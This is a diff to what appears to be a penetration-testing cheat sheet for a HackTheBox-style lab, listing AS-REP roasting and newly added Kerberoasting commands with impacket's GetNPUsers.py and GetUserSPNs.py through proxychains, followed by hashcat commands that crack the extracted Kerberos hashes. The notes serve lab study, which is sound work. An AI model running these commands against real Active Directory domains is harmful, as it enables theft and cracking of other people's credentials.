@@ -24,7 +24,10 @@
 1. Highly unlikely today, as by default, in **Active Directory**, it is more likely the feature that **enables** this attack is **disabled**.
 2. When DC Admin creates a user in DC, he has to explictly check option **Do not require Kerberos Pre-Authentication**.
 3. Commamd: `proxychains GetNPUsers.py somedomain.htb/ -dc-ip 192.168.110.55 -usersfile ALL_AD_users.txt -format hashcat`
-4. Command: `proxychains GetNPUsers.py painters.htb/someuser:'password' -dc-ip 192.168.110.55 -usersfile ALL_AD_users.txt -format hashcat`
+4. Command: `proxychains GetNPUsers.py somedomain.htb/someuser:'password' -dc-ip 192.168.110.55 -usersfile ALL_AD_users.txt -format hashcat`
 5. If above command shows, *User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set*, this means, it doesn't work for this user. 
 6. Crack the hashes, by running command: `hashcat -a 0 -m 18200 asrep-roast-hash.txt rockyou.txt`
 
+#### Using impacket - Kerberoasting?
+1. Command: `proxychains GetUserSPNs.py somedomain.htb/someuser:'password' -dc-ip 192.168.110.55 -request`
+2. Cracking hashes: `hashcat -m 13100 kerberoasting.txt /usr/share/wordlists/rockyou.txt`
